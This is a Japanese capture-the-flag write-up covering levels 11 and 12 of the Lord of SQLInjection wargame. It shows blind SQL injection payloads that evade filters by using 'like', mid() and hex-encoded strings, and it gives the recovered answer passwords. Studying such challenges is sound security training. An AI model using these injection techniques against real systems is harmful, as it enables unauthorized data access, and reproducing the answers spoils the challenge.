# Lord of SQLInjection writeup 11-15
## 11 - golem
04,07と同じだが禁止文字が増え、`substr`も`=`も使えない。    
`=`の代わりに、文字列は`like`、数値は`<`を使ってみる。  
```
?pw='||id like'admin'%26%26length(pw)<2%23
?pw='||id like'admin'%26%26length(pw)<3%23
:
?pw='||id like'admin'%26%26length(pw)<8%23
?pw='||id like'admin'%26%26length(pw)<9%23
```
`<8`と`<9`のところで結果が変わったので、また8文字だろう。  
次はパスワードを1文字ずつ見ていくが、`substr`が使えないので`mid`を使ってみる。
```
?pw='||id='admin'%26%26mid(pw,1,1)like'0'%23
?pw='||id='admin'%26%26mid(pw,1,1)like'1'%23
?pw='||id='admin'%26%26mid(pw,1,1)like'2'%23
:
```
そろそろスクリプトで自動化しないとつらい。

### 回答例
```
?pw=77d6290b
```
> query : select id from prob_golem where id='guest' and pw='77d6290b'

## 12 - darkknight
また同じパターンで、さらに禁止文字が増えている。  
`pw`は文字列が想定されており、SQL文で変数の前後が`'`で囲まれているが、`'`が禁止されているので、ここを抜け出すのはつらい。  
もう1つのパラメータ`no`は数値が想定されており、`'`を使わずに追加のクエリを書き始められるので、こちらを攻める。  

また8文字だろうと期待して試行。
`'`が使えないので問題03と同じく、Hex済みの`admin`を使う。   
数値にもlikeが使えたので、`<`を使うのはやめた。
```
?no=0 or id like 0x61646d696e and length(pw) like 8
```
パスワードを試していく。
```
?no=0 or id like 0x61646d696e and mid(pw,1,1) like 0
```
1文字目は`0`でうまくいったが、2文字目はどうも数字ではない模様。  
`'`が使えないので、16進数で表記した`a`、`0x61`から試していく。  
```
?no=0 or id like 0x61646d696e and mid(pw,2,1) like 0x61
?no=0 or id like 0x61646d696e and mid(pw,2,1) like 0x62
```
すぐ見つかってよかった。2文字目は`b`のようだ。あとはひたすら続ける。  

### 回答例
```
?pw=0b70ea1f
```
> query : select id from prob_darkknight where id='guest' and pw='0b70ea1f' and no=



























